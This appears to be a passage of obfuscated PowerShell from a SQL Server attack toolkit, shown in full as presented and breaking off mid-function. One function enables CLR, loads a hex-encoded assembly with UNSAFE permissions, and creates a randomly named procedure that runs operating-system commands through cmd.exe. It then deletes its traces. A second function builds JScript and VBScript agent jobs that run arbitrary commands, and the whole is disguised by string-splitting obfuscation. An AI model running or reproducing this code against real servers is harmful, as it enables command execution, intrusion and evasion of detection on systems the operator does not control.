                {
                    &("{0}{3}{4}{1}{2}"-f'Writ','rb','ose','e-','Ve') -Message ("$Instance "+': '+'Y'+'ou '+'a'+'re '+'a '+'s'+'ysadm'+'in.')
                    ${is`clrE`N`AB`leD} = &("{2}{1}{0}"-f 'Query','et-SQL','G') -Instance ${In`s`Tance} -Query ((("{5}{2}{0}{6}{3}{1}{4}" -f 'f','}CLR Enab','_con','{0','led{0}','sp','igure '))-f[chAr]39) -Username ${USERN`AME} -Password ${pa`sSW`ORd} -Credential ${crE`De`N`TIal} -SuppressVerbose | &("{1}{2}{3}{0}" -f 'ject','S','elect-O','b') -Property ("{0}{3}{2}{1}"-f'co','g_value','fi','n') -ExpandProperty ("{2}{0}{3}{1}" -f 'onfi','_value','c','g')
                    ${isShOWADvANc`E`D`enAb`lEd} = &("{0}{2}{1}" -f'Ge','-SQLQuery','t') -Instance ${inSTA`N`ce} -Query ((("{5}{8}{4}{6}{2}{9}{1}{7}{3}{0}" -f 'Options{0}','v','w A','d ','}Sh','sp_configure {','o','ance','0','d')) -F[chAr]39) -Username ${us`eRnA`me} -Password ${PA`sS`WORD} -Credential ${C`RedEN`TI`AL} -SuppressVerbose | &("{0}{2}{1}{3}" -f 'Select','Ob','-','ject') -Property ("{2}{1}{0}" -f 'e','ig_valu','conf') -ExpandProperty ("{2}{3}{0}{1}"-f'g','_value','conf','i')
                }
                else
                {
                    &("{1}{2}{0}{3}" -f 'r','W','rite-Ve','bose') -Message ("$Instance "+': '+'Y'+'ou '+'ar'+'e '+'no'+'t '+'a '+'sys'+'a'+'dmin.'+' '+'T'+'his '+'comm'+'a'+'nd '+'requir'+'es '+'sy'+'s'+'admi'+'n '+'privileg'+'e'+'s.')

                    
                    ${nu`LL} = ${tb`lr`eSuL`Ts}."rO`ws".("{0}{1}" -f'A','dd').Invoke("$ComputerName","$Instance",("{4}{5}{0}{2}{1}{6}{3}"-f'd','e','min privil','.','No ','sysa','ges'))
                    return
                }

                
                if (${iSSHow`AD`V`ANce`deNABL`ed} -eq 1)
                {
                    &("{1}{3}{2}{0}" -f 'Verbose','W','te-','ri') -Message ("$Instance "+': '+'S'+'how '+'Adv'+'anc'+'ed '+'Opti'+'ons'+' '+'i'+'s '+'already'+' '+'en'+'ab'+'led.')
                }
                else
                {
                    &("{1}{3}{0}{2}"-f'erbo','Writ','se','e-V') -Message ("$Instance "+': '+'Sho'+'w '+'Adv'+'an'+'ce'+'d '+'Opt'+'ions'+' '+'is'+' '+'disable'+'d'+'.')
                    ${d`IsaB`leShO`WAdV`A`NCeDOPt`IoNs} = 1

                    
                    &("{1}{0}{2}{3}"-f 't-','Ge','S','QLQuery') -Instance ${I`NSt`ANcE} -Query ((("{5}{7}{8}{3}{10}{11}{0}{2}{4}{6}{9}{1}" -f'ce','GURE','d Options{0}','}S',',','sp_','1;RECO','configure',' {0','NFI','how Adv','an'))  -f  [chAr]39) -Username ${uSeRn`A`Me} -Password ${PAsSw`ORD} -Credential ${C`ReDE`NTiAL} -SuppressVerbose

                    
                    ${ISsH`OWadv`A`N`CE`DenaBLeD2} = &("{1}{0}{2}{3}"-f'LQ','Get-SQ','ue','ry') -Instance ${iNsT`ANCe} -Query ((("{5}{3}{8}{6}{0}{2}{7}{9}{1}{4}"-f 'mu4Show A',' Optio','d','ig','nsmu4','sp_conf','re ','vanc','u','ed'))-ReplAcE([chaR]109+[chaR]117+[chaR]52),[chaR]39) -Username ${Us`ernAMe} -Password ${pAS`swo`Rd} -Credential ${cRED`E`NtiaL} -SuppressVerbose | &("{0}{2}{3}{1}" -f 'Se','t','lect','-Objec') -Property ("{0}{2}{1}{3}"-f 'con','ig_val','f','ue') -ExpandProperty ("{2}{1}{0}"-f 'lue','g_va','confi')

                    if (${i`sS`HoWadVAncedEnaB`Led2} -eq 1)
                    {
                        &("{0}{1}{3}{2}"-f'Wri','te-','rbose','Ve') -Message ("$Instance "+': '+'En'+'abled '+'Show'+' '+'A'+'dvanced'+' '+'Op'+'tions.')
                    }
                    else
                    {
                        &("{1}{2}{0}"-f'ose','Wr','ite-Verb') -Message ("$Instance "+': '+'En'+'abli'+'ng '+'Sho'+'w '+'A'+'dvance'+'d '+'Optio'+'n'+'s '+'fai'+'led. '+'Ab'+'ortin'+'g.')

                        
                        ${nU`LL} = ${T`BLREsul`Ts}."r`oWs".("{1}{0}"-f 'd','Ad').Invoke("$ComputerName","$Instance",("{3}{1}{7}{2}{4}{0}{6}{5}" -f'van','ld not','h','Cou','ow Ad','.','ced Options',' enable S'))
                        return
                    }
                }

                
                if (${Is`clRenAbl`ED} -eq 1)
                {
                    &("{3}{0}{2}{1}"-f't','bose','e-Ver','Wri') -Message ("$Instance "+': '+'CLR'+' '+'is'+' '+'alre'+'ady '+'e'+'nab'+'led.')
                }
                else
                {
                    &("{0}{3}{2}{1}{4}"-f'Wr','Verb','e-','it','ose') -Message ("$Instance "+': '+'C'+'LR '+'i'+'s '+'disabl'+'ed'+'.')
                    ${DIs`Ab`lEclR} = 1

                    
                    &("{1}{0}{2}"-f '-','Get','SQLQuery') -Instance ${in`Sta`NcE} -Query ((("{2}{6}{1}{0}{5}{3}{7}{4}{8}"-f'le',' Enab','sp_configu','E','FI','d{0},1;R','re {0}CLR','CON','GURE'))  -F  [Char]39) -Username ${UsErNa`ME} -Password ${Pas`sW`O`Rd} -Credential ${C`ReDeN`TIal} -SuppressVerbose

                    
                    ${Isclrena`B`l`Ed2} = &("{1}{0}{2}" -f'et-SQLQ','G','uery') -Instance ${INs`TA`NCE} -Query ((("{1}{7}{6}{0}{9}{2}{5}{3}{8}{4}"-f'{0}','sp_confi','En','ed{','}','abl','e ','gur','0','CLR ')) -f[ChAr]34) -Username ${u`SeRname} -Password ${P`AsS`wOrD} -Credential ${CR`Ed`enTiAL} -SuppressVerbose | &("{4}{1}{3}{0}{2}"-f'b','t','ject','-O','Selec') -Property ("{1}{2}{0}" -f 'value','c','onfig_') -ExpandProperty ("{2}{1}{0}" -f 'ue','_val','config')

                    if (${IS`CLR`enabLE`d2} -eq 1)
                    {
                        &("{1}{2}{3}{4}{0}"-f'se','Wri','te','-Ve','rbo') -Message ("$Instance "+': '+'E'+'nabl'+'ed '+'CLR'+'.')
                    }
                    else
                    {
                        &("{2}{1}{0}"-f 'e','e-Verbos','Writ') -Message ("$Instance "+': '+'En'+'abling '+'C'+'LR '+'faile'+'d. '+'Ab'+'orti'+'n'+'g.')

                        
                        ${Nu`ll} = ${TB`lRESu`lTS}."R`OWS".("{0}{1}"-f'A','dd').Invoke("$ComputerName","$Instance",("{0}{2}{3}{5}{1}{4}" -f'Cou','e','ld n','ot ena',' CLR.','bl'))

                        return
                    }
                }

                
                ${rA`N`dAs`sE`mbLyLE`NGTH} = (8..15 | &("{0}{2}{1}" -f 'Get','ndom','-Ra') -count 1 )

                
                ${ra`Nda`SSEMBLy`NA`mE} = (-join ((65..90) + (97..122) | &("{2}{3}{0}{1}" -f'o','m','Get-R','and') -Count ${RANDA`ssem`BLYLen`GtH} | &('%') {[char]${_}}))
                ${R`An`D`Procn`AME} = (-join ((65..90) + (97..122) | &("{1}{2}{0}"-f 'Random','Ge','t-') -Count ${RAN`DaSsE`MbL`yleNg`TH} | &('%') {[char]${_}}))
                &("{1}{0}{3}{2}" -f 'ite','Wr','se','-Verbo') -Message ("$Instance "+': '+'Assemb'+'ly'+' '+'n'+'a'+'me: '+"$RandAssemblyName")
                &("{1}{0}{2}" -f 'te','Wri','-Verbose') -Message ("$Instance "+': '+'CL'+'R '+'P'+'r'+'oc'+'edure '+'name:'+' '+"$RandProcName")

                
                ${QUer`y_Ad`Da`sS`em`BLY} = ('C'+'REATE '+'A'+'SSE'+'M'+'BLY '+"[$RandAssemblyName] "+'A'+'U'+'THORIZAT'+'I'+'ON '+'[dbo]'+' '+'f'+'rom '+'0x4D5A9000'+'0300000004000000FFFF0000B800000000000'+'00040000000000000000000000000000000000000000000000000000000000'+'0000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300652F5559000000000'+'0000000E0000221'+'0B010'+'8000008000'+'000060000000000004E2700000020000000400000000040000020000000020000040000000000000004000000000'+'00000008000000002000000000000030'+'04085'+'00001000001000'+'000000100000100000000000001000000000000'+'0000'+'0000000002700004B00000000400000A002000000000'+'0000'+'00000000000000000000000006000000C'+'000000000000000000000'+'0000000'+'000000'+'0000000'+'000000'+'000000000000000'+'00000000000000000000000000000000000000000'+'0200000080000000000000000000000082000004800000000000000000000002E'+'7465787400000054070000002000000008000000'+'020000'+'00000000000000000'+'0000000200000602E7'+'2737'+'2'+'63000'+'000A00200000040000000040000000A0'+'000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000000E000000000000000000000000000040000042000000000000'+'000000000000000000003027000000000000480000000200050028210000D8050000010000000000000000000000'+'0000000000000000'+'000000000000000000000000'+'000000000'+'00000000000000000000000000000000000000013300600C30000000100001100730'+'400000A0A066F0500000A72010000706F0600000A00066F0500000A7239000'+'0700F00280700'+'000A280800000A6F0900000A00066F0500000A166F0A00'+'000A00066F0500000A176F0B'+'00000A0'+'0066F0C00000'+'A26178D090000010C081672490000701F0C20A00F00006A730D00000AA208730E00000A0B280F00000A076F1000000A000716066F11'+'00000A6F1200000A6F130000'+'0A6F1400000A00280F00000A076F1500000A00280F00000A6F1600000A'+'00066F170'+'0'+'000A00066F1800000A002A1E02281900000A2A0042'+'534A42'+'01000100000000000C00000076322E302E35303732370000000005006C000000E0'+'010000'+'237E00004C020000900200'+'00235374726'+'96E67730000'+'0000DC0400005800000023555'+'300340500001000000023475549440000004405000094'+'0000'+'002'+'3426C6'+'F620000000'+'000000002000001471502000900000000FA0133001600000100000'+'00F0000000200000002000000010000001900000003000000010000000100000003'+'00000000000A000100000000'+'000600370030000A005F004A00060098'+'0078000600B80078000A00F900DE000E002E011B010E0036011B01060'+'06'+'C0130000'+'A00BD01DE000A00C9'+'013E000A00D301DE000A00E101DE000A00EC01DE00060'+'018020E02060038020E0'+'20000'+'0000'+'01000000000001000100010010'+'0016000000050001000100502000000000960069000A0001001F21000000'+'0086187200100002000000010'+'00F0119007200140021'+'0072001000290072001000310072001000310047011E003900'+'55012300110062012800410073012C0039007A012300390'+'08801320039009C0132003100B7013700'+'490'+'072003B005900720043006100F4014A0'+'06900FD014F0031002502550079004302280'+'009004D0'+'228'+'00590056025A00690060024F0069006F02100031007E02100031008A02100009007200100020001B001'+'9002E000B006A002E001300'+'730060000480000'+'00000000000000000000000000000D600000002000000000000000000000'+'0010027000000'+'00000200000000'+'0000000000000001003E0000000000020'+'00000000000000000000001003000000000000000003C4D6F6475'+'6C653E00'+'636C7266696C652E646C6C00537'+'46F72656450726F636564757'+'26573006'+'D73636F726C69620053797374656D004F626A6563740053797374656D2'+'E446174610053797374656D2E446174612E53716C54797065730053716C537472696'+'E6700636D645F65786563002E63746F720053797374656D2E52756E74696D652E436F6D70696C'+'6572536572766963657300436F6D70696C6174696F6E52656C61786174'+'696F6E734174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500636C7266696C65004D6963726F736F66742E53716C5365727665722E'+'5365727665720053'+'716C50726F6'+'365647572654174747269627574650065786563436F6D6D616E640053797374656D2E44'+'69616'+'76E6F7374696373005'+'0726F636573730050726F6365'+'73735374617274496E666F006765745F537461727449'+'6E666F007365745F46696C654E6'+'16D65006765745'+'F56616C756500537472696E6700466F726D6174007365745F417267756D'+'656E7473007365745F5573655368656C6C45786563757465007365745F52656469726563745374616E646172'+'644F75747075740053746172740053716C4D6574614461746100'+'53716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065'+'0067657'+'45F5069706'+'50053656E64526573756C747353746172740053797374656D2E494F0'+'053747265616D52656'+'164657200676574'+'5F537461'+'6E646172644F757470757400546578745265616465720052656164546F456E6400546F537472696E670053657453747269'+'6E67005'+'3656E64526573756C7473526F770053656E64526573756C7473456E640057616974466F724578697400436C6F7365000037430'+'03A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064'+'002E00650078006500000F20002F00430020007B0030007D00000D6F0075007400700075'+'00740000002A5DFE759C'+'75BA4399A49F834BF07EE5'+'0008B77A5C561934E089050001011109032000010420010108040100'+'0000042000121D042001010E0320000E0500020E0E1C042001010203200002072'+'003010E1'+'1290'+'A062001011D1225040000123'+'505200101'+'122D04200012390520'+'0201080E0907031219122D1D1225080100080000'+'0000001E010001'+'00540216577261704E6F6E457863657074696F6E5468726F77730100002'+'827000000000000000000003E27000'+'0002000000000000000000000000000000000000000000000302700000000000000005F436F72'+'446C6C4D61696E006D73636F72'+'65652E646C6C000'+'0000000FF25002040'+'000000000'+'00000000000000'+'0000000000000000000000000000'+'00'+'0000000000000000000000000000000000'+'0000000'+'0000000000000000000000000000000'+'000000000000000000'+'0000000000000000000000000000000000000000000000000000000000000000000'+'000000000000000000000000'+'00000000000000'+'0'+'0000'+'0000000000000000000000000000000000'+'0000000000000000000000'+'00000000000000000000000000000000000000000000000000000000000000000010010000000180000800000000000000000000000000000010001000000300000800000000000'+'00000000000000000001000000000048000000584000004402000'+'000000000000'+'00000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100'+'00000000000000000'+'0000000000000003'+'F000000000000000400000002000000000000000000000'+'0000'+'000004400000001005'+'6'+'0061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460'+'0690'+'06C00650049006E0066006F0000008001000001003000300030003000300034006'+'20030000'+'0002C0002000100460069006C006500440065'+'0073'+'006300720069007000740069006F'+'006E000000000020000000300008000100460069006C006500560065007200730069006F006E0'+'00000000030002E0030002E0030002E003000'+'000038'+'000C00010049006E007400650072006E0061006C004E0061006D0065'+'00000063006C007200660069006C0065002E0064006C006C0000002800020001004C00650067006100'+'6'+'C0043006F007'+'00079007200690'+'067006800740000002000000040000C0001004F'+'00'+'720'+'0690'+'0670069006E00610'+'06C00460069006C0065006E0061006D006500000063006C'+'007200660069006C0065002E'+'0064006C006C000000340008000100500072006F0064007'+'5006300740'+'0560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006'+'C00790'+'0200056006500'+'7200730069006F006E00000030002E0030002E003'+'0002E003000000000000000000000000000000'+'000'+'0000000000000'+'0000000000000000000000000000000000000000'+'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'+'0000000'+'0000000000000000000000'+'0000000'+'0000000000000000000000000000'+'00000'+'00000000'+'0000000000000000'+'000000000000000000000000000000000000000000000000000000000000000000000000'+'00000000000000000000000000000000000000000000000000'+'00'+'000000000000000000000000000'+'000000000'+'000000000000000000000000000000000000000000000000000000000000000000000'+'000000'+'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'+'000'+'00000'+'000000000000000000000000000000000000000000000000000000000000000000000000000002000000C00'+'0000503700000000000000000000000'+'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'+'000000000'+'00000000000000000000000000000000000000000000000000000000'+'000000000000000000000000000000000'+'00000000000000000000000000000000000000000000000000000000000000000000000000'+'000000000000000000000000000000000000000000000000000'+'0000000000000000000000'+'0000000000000000000000000000000'+'000000000000000000000000000000000000000000000000000000000000'+'0000'+'00000000000000'+'000000000000000000000000'+'0'+'0000000000000000000000000000'+'00000000000000000000000000000000000000000000000000'+'00000000000000000000000000'+'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'+'000000000000000000000000000000000000000000'+'00000000000000'+'0000000000000000'+'000000000000'+'000'+'0000'+'00000000000'+'0000000000000000000000000000000000000000'+'000000000000000000000000000000000000 '+'wit'+'h '+'per'+'m'+'iss'+'ion_set '+'= '+'UNS'+'AFE')
                &("{1}{2}{3}{0}" -f 'y','Get','-','SQLQuer') -Instance ${InS`T`AnCe} -Query ${q`U`eRy_a`ddaS`semB`LY} -Username ${U`SEr`NAme} -Password ${pA`ss`WORd} -Credential ${c`REDentI`Al} -SuppressVerbose -Database ("{1}{0}"-f 'B','MSD') 
                                
                
                ${QUeRy`_AdDpr`oc} = ('CREAT'+'E '+'PROCE'+'DU'+'RE '+"[dbo].[$RandProcName] "+'@ex'+'ecC'+'o'+'mm'+'and '+'NVARCH'+'A'+'R'+' '+'('+'MAX) '+'AS'+' '+'EX'+'TERNAL '+'N'+'AME '+"[$RandAssemblyName].[StoredProcedures].[cmd_exec];")
                &("{0}{3}{1}{2}" -f 'Get','SQLQ','uery','-') -Instance ${i`N`sTAn`cE} -Query ${QuerY`_`Ad`Dproc} -Username ${U`s`ERnAmE} -Password ${p`A`sSWorD} -Credential ${cReD`EN`TIAl} -SuppressVerbose -Database ("{0}{1}" -f 'MS','DB') 

                
                &("{3}{0}{2}{1}" -f'r','ose','ite-Verb','W') -Message ("$Instance "+': '+'Run'+'ning '+'com'+'ma'+'nd: '+"$Command")
                ${quE`RY} = ('EXEC'+' '+"[$RandProcName] "+"'$Command'")                

                
                ${C`M`DRES`UlTS} = &("{1}{0}{2}"-f 't-SQLQuer','Ge','y') -Instance ${I`N`sTaNcE} -Query ${Q`U`eRY} -Username ${USe`RnA`ME} -Password ${pA`sswo`RD} -Credential ${creDE`N`TI`AL} -SuppressVerbose -Database ("{0}{1}"-f'M','SDB') 

                
                if(${Ra`wresu`L`Ts})
                {
                    [string]${C`mDReSul`TS}."Ou`Tput"
                }
                else
                {
                    try
                    {
                       ${Nu`Ll} = ${tbLr`ES`Ul`Ts}."R`OWS"."a`DD"(${ComP`U`T`eRNAMe}, ${in`sta`NCE}, [string]${CmDrEs`U`L`TS}."oU`TPuT")
                    }
                    catch
                    {
                    }
                }

                
                &("{0}{1}{3}{2}"-f'Get-','SQLQu','ry','e') -Instance ${I`N`sTancE} -Query ('DROP'+' '+'PR'+'OCEDU'+'RE '+"$RandProcName") -Username ${u`seRN`AME} -Password ${pasSW`o`RD} -Credential ${cre`DeN`Ti`Al} -SuppressVerbose -Database ("{1}{0}"-f'DB','MS')
                &("{3}{1}{2}{0}"-f'ry','et-SQLQu','e','G') -Instance ${iNSTA`NcE} -Query ('DR'+'OP '+'A'+'SSEMBLY '+"$RandAssemblyName") -Username ${u`SeRna`ME} -Password ${P`AssWO`RD} -Credential ${cr`E`DEnt`iAl} -SuppressVerbose -Database ("{0}{1}" -f'M','SDB')

                
                if(${Di`sabl`EC`lR} -eq 1)
                {
                    &("{2}{1}{0}"-f'te-Verbose','i','Wr') -Message ("$Instance "+': '+'Di'+'sab'+'ling '+'CL'+'R')
                    &("{1}{2}{0}" -f 'ery','Get-SQLQ','u') -Instance ${iN`St`AnCE} -Query ((("{0}{1}{11}{7}{8}{9}{3}{12}{4}{2}{6}{5}{10}" -f's','p','{0},0','e {0}CLR E','ed','NFI',';RECO','nf','ig','ur','GURE','_co','nabl'))-f [char]39) -Username ${USe`RNa`me} -Password ${pASS`Wo`RD} -Credential ${cred`e`NT`IaL} -SuppressVerbose
                }

                
                if(${DIsablEs`HoWADVA`Nc`Edop`TIo`NS} -eq 1)
                {
                    &("{3}{2}{4}{0}{1}" -f 'er','bose','te','Wri','-V') -Message ("$Instance "+': '+'Disa'+'blin'+'g'+' '+'S'+'how '+'Advanced'+' '+'O'+'p'+'tions')
                    &("{1}{0}{2}{3}"-f '-SQL','Get','Qu','ery') -Instance ${iN`sTan`CE} -Query ((("{4}{0}{7}{5}{6}{2}{1}{3}"-f'_','E,0;','nsTH','RECONFIGURE','sp','e THEShow Ad','vanced Optio','configur')) -replace  'THE',[CHar]39) -Username ${Use`RNA`Me} -Password ${pa`sSw`o`RD} -Credential ${CR`eD`e`NtiaL} -SuppressVerbose
                }

                
                ${CoNnE`ct`IOn}.("{1}{0}"-f'ose','Cl').Invoke()

                
                ${COnnEc`T`IOn}.("{1}{2}{0}"-f'se','D','ispo').Invoke()
            }
            catch
            {
                

                if(-not ${sUpPR`EsS`V`E`Rb`oSE})
                {
                    ${E`Rror`m`es`sAGe} = ${_}."eX`cePt`iOn"."mess`Age"
                    &("{3}{2}{0}{1}{4}" -f'rbo','s','te-Ve','Wri','e') -Message ("$Instance "+': '+'Connect'+'i'+'on'+' '+'Failed'+'.')
                    
                }

                
                ${n`ULL} = ${T`Blr`es`ULts}."R`owS".("{0}{1}" -f'Ad','d').Invoke("$ComputerName","$Instance",("{2}{0}{3}{1}" -f'cessi','e','Not Ac','bl'))
            }
        }

        
        ${P`I`peLiNeI`T`eMS} | &("{1}{0}{2}" -f'oke','Inv','-Parallel') -ScriptBlock ${My`sCriPt`BlO`ck} -ImportSessionFunctions -ImportVariables -Throttle ${Thr`e`Ads} -RunspaceTimeout 2 -Quiet -ErrorAction ("{1}{2}{0}{4}{5}{3}" -f'n','Sil','e','nue','tlyCont','i')

        return ${TBLRE`SUl`TS}
    }
}











Function  InvOKE`-`s`qLo`scmDag`ENtjOB
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANdATory = ${F`AL`Se},
        hElPmesSage = {"{7}{2}{0}{4}{1}{10}{3}{5}{9}{6}{8}"-f'er or d','a',' Serv','t','om','o aut','nticate wi','SQL','th.','he','in account '})]
        [string]${uS`Er`NAMe},

        [Parameter(MANdatORy = ${f`ALSe},
        HElPMEsSaGE = {"{13}{14}{4}{2}{8}{10}{11}{9}{5}{0}{12}{6}{1}{15}{3}{7}" -f 't','he','m','i','o','n','aut','th.','ain','ou',' a','cc',' password to ','S','QL Server or d','nticate w'})]
        [string]${PaSs`wOrD},

        [Parameter(maNDatORy = ${F`AL`SE},
        helPmESsAGe = {"{1}{2}{3}{0}" -f 'ws credentials.','Wi','nd','o'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cr`edEnT`iAL} =   ( CHiLdItem ("vARIABLE:04"+"59"+"m2")).value::"emp`TY",

        [Parameter(MaNdAtOrY = ${f`AL`Se},
                ValUEfROMpIPElInE = ${T`RUe},
                VaLUefRompiPELineByPrOPeRtynAMe = ${T`Rue},
        hElpMESSAge = {"{1}{0}{2}{6}{5}{3}{4}" -f'er i','SQL Serv','nsta','nection t','o.','ce to con','n'})]
        [string]${INST`A`NCe},

        [Parameter(Mandatory = ${fA`l`se},
        HelPmesSAgE = {"{3}{2}{5}{7}{10}{4}{0}{9}{8}{1}{6}"-f'd Ad','onnec','nne','Co','cate','ct usin','tion.','g','in C','m',' Dedi'})]
        [Switch]${D`AC},

        [Parameter(mANDatory = ${t`RUE},
        HELpMESSaGe = {"{7}{3}{9}{6}{1}{5}{15}{2}{8}{4}{14}{12}{16}{0}{11}{10}{13}" -f'nd V',' incl','x','por','Shell','ude Cmd','s','Sup','ec, Power','t subsystem','ip','BScr','Sc','t.',', J','E','ript, a'})]
        [ValidateSet({"{1}{0}{2}"-f'md','C','Exec'}, {"{1}{0}{2}"-f 'erShel','Pow','l'},{"{1}{0}{2}" -f 'p','JScri','t'},{"{2}{1}{0}" -f 'cript','BS','V'})]
        [string] ${s`UbSYs`T`EM},

        [Parameter(mANdaTory = ${t`RUE},
        HElpmeSSAgE = {"{0}{4}{1}{2}{3}" -f 'OS','to be ','exe','cuted.',' command '})]
        [String]${Co`Mm`AnD},

        [Parameter(manDatORY = ${f`A`lSE},
        heLPMessAGE = {"{2}{0}{6}{3}{1}{4}{5}"-f 'onnection ','eo','C','m','u','t.','ti'})]
        [string]${t`iM`eOuT},

        [Parameter(ManDAtOry = ${fa`Lse},
        HELpMEsSAGE = {"{1}{5}{4}{7}{9}{8}{3}{0}{2}{6}"-f'e age','Co','n','illing th','run t','mmand ','t job.','i','e k','me befor'})]
        [int]${sl`eep} = 5,

        [Parameter(mANDAtoRy = ${f`A`lSe},
        helpmEssaGE = {"{0}{7}{5}{6}{10}{1}{8}{13}{2}{9}{4}{11}{3}{12}"-f 'S','e error',' fu','rapped','t','ppress ver','bo','u','s.  Use','nc','s','ion is w','.','d when'})]
        [switch]${su`ppr`eS`SVerbOsE}
    )

    Begin
    {
        
        ${t`BLc`OmmaN`DS} = &("{0}{2}{1}" -f'New','t','-Objec') -TypeName ("{4}{1}{0}{2}{3}{6}{5}"-f 'ta.D','m.Da','a','t','Syste','Table','a')
        ${tb`lR`eSulTs} = &("{2}{1}{0}" -f 't','ew-Objec','N') -TypeName ("{2}{3}{5}{1}{0}{4}" -f'Tabl','ta','Sys','tem.Dat','e','a.Da')
        ${n`Ull} = ${tb`lReS`U`lTs}."co`LUM`NS".("{1}{0}"-f'd','Ad').Invoke(("{1}{2}{0}"-f 'ame','Computer','N'))
        ${nU`Ll} = ${tBlRES`UL`Ts}."colU`mNS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f 'tance','Ins'))
        ${n`UlL} = ${TbLreS`U`l`Ts}."cO`LUmnS".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}" -f'sults','Re'))

    }

    Process
    {
        
        if(-not ${inSt`AnCe})
        {
            ${INS`T`ANce} = ${enV:CO`M`P`UTErN`Ame}
        }

        
        if(${D`AC})
        {
            
            ${CONNEC`T`IoN} = &("{5}{2}{3}{0}{4}{1}"-f'onObje','t','nnect','i','c','Get-SQLCo') -Instance ${In`sTA`NCE} -Username ${Usern`A`me} -Password ${PA`ss`wORd} -Credential ${c`R`EDEntI`AL} -DAC -TimeOut ${tIMEO`Ut}
        }
        else
        {
            
            ${Co`NNe`ctIoN} = &("{1}{0}{3}{2}" -f'LConn','Get-SQ','bject','ectionO') -Instance ${i`Nst`Ance} -Username ${u`S`ERname} -Password ${pAS`s`wOrd} -Credential ${Cr`e`den`TIAL} -TimeOut ${t`IMeO`UT}
        }
        
        try
        {
            
            ${C`oNne`cTiOn}.("{1}{0}"-f'pen','O').Invoke()
            if(-not ${s`UP`PRESsv`eR`BOSe})
            {
                &("{2}{1}{0}" -f 'ose','rite-Verb','W') -Message ("$Instance "+': '+'C'+'onn'+'ecti'+'on '+'Succe'+'ss.')

                
                &("{1}{0}{2}" -f'e-Verbos','Writ','e') -Message ("$Instance "+': '+'SubSy'+'s'+'tem: '+"$SubSystem")
                &("{0}{2}{1}{3}" -f 'Write-','os','Verb','e') -Message ("$Instance "+': '+'Co'+'mmand: '+"$Command")
            }

            
            ${SERv`e`RINFO} = &("{3}{4}{2}{0}{5}{1}"-f 'erv','fo','S','Get-SQ','L','erIn') -Instance ${I`N`StanCE} -Username ${uSe`RNa`Me} -Password ${Pas`SW`ORd} -Credential ${C`Re`D`ENtial} -SuppressVerbose
            ${cURr`e`Nt`log`iN} = ${s`ErVeR`info}."cuR`Ren`TLO`gIN"
            ${C`OMp`U`TerNAme} = ${Se`R`VEri`NfO}."ComPU`T`E`RnamE"
            ${S`ySaDMI`NstAt`US} = ${SE`RVErin`Fo}."IS`SYSadM`IN"

            

            
            
            
            

            
            if(${s`ysAD`MInSta`TuS} -eq "Yes"){
                ${coNfIr`M`Edp`Ri`Vs} = ${CU`R`R`EntlO`gIn}
            }

            
            ${AddJOb`PR`IvS} = &("{2}{1}{0}{3}{6}{4}{7}{5}"-f 'LDa','-SQ','Get','t','seRole','ber','aba','Mem') -Username ${U`SeRNa`ME} -Password ${Pas`s`WOrD} -Instance ${I`NstaN`CE} -DatabaseName ("{1}{0}" -f 'b','msd') -SuppressVerbose |             
            &("{2}{0}{1}"-f 'rEach-Obje','ct','Fo') {                                 
                if((${_}."Rol`ePRiNCIP`A`LNaMe" -match ((("{8}{9}{7}{3}{1}{14}{2}{10}{5}{13}{12}{6}{11}{4}{0}" -f'e','erRole{','}SQL','Us','rRol','de','perat','nt','SQLAg','e','AgentRea','o','tO','rRole{0}SQLAgen','0')) -f  [Char]124))) {
                    if (${_}."p`RINCIPal`N`AME" -eq ${CuRrE`NTlo`GIn}) { 
                        ${c`ONF`irMed`pR`ivs} = ${cuR`RE`Ntlo`GIn} 
                    }
                }
            }

            
            if(${C`on`FIR`MeD`PrIVS})
            {
                &("{0}{1}{2}" -f 'Wr','ite','-Verbose') -Message ("$Instance "+': '+'Yo'+'u '+'hav'+'e '+'EXE'+'CUTE '+'pr'+'i'+'vileges '+'t'+'o '+'c'+'rea'+'te '+'Age'+'nt '+'Jo'+'bs '+'('+'sp'+'_add_j'+'o'+'b).')

                
                ${dATa`BaS`E`SUb} = ""
                ${sUB`S`YsT`eMFiNaL} = ${sUBs`ysT`eM}

                
                If(${SU`B`SYs`Tem} -eq ("{0}{1}"-f'JSc','ript')){

                    
                    ${CoMm`A`ND} = ${co`mM`And}.("{0}{1}{2}"-f'R','eplac','e').Invoke("\","\\")
                

                    
                    
                    ${j`scrIPt_`cO`M`mand} = @"
function RunCmd()
{
    var WshShell = new ActiveXObject("WScript.Shell");  
    var oExec = WshShell.Exec("$Command"); 
    oExec = null; 
    WshShell = null; 
}

RunCmd(); 
"@
                    
                    ${cOM`mANd} = ${JScRIP`T`_`c`O`MmAnd}
                    ${SUb`Syst`EM`FI`NAL} = ("{2}{4}{1}{3}{0}" -f'ing','cr','Active','ipt','S')
                    ${da`TAbAS`e`sUB} = ((("{6}{3}{0}{5}{2}{1}{4}" -f 'se','toB','JavaScrip','ataba','b,','_name=NoBb','@d'))."r`EpLaCe"(([chAR]111+[chAR]66+[chAR]98),[StriNg][chAR]39))	
                }


                
                If(${Sub`s`ysTEM} -eq ("{2}{0}{1}" -f'BScrip','t','V')){

                    
                    
                    ${VbSc`RIPt_`cOm`mAnd} = (('{0'+'}
Func'+'tion'+' ')-f[ChaR]34+'Mai'+'n'+'()
 '+' '+' '+' '+'dim'+' '+'she'+'l'+'l
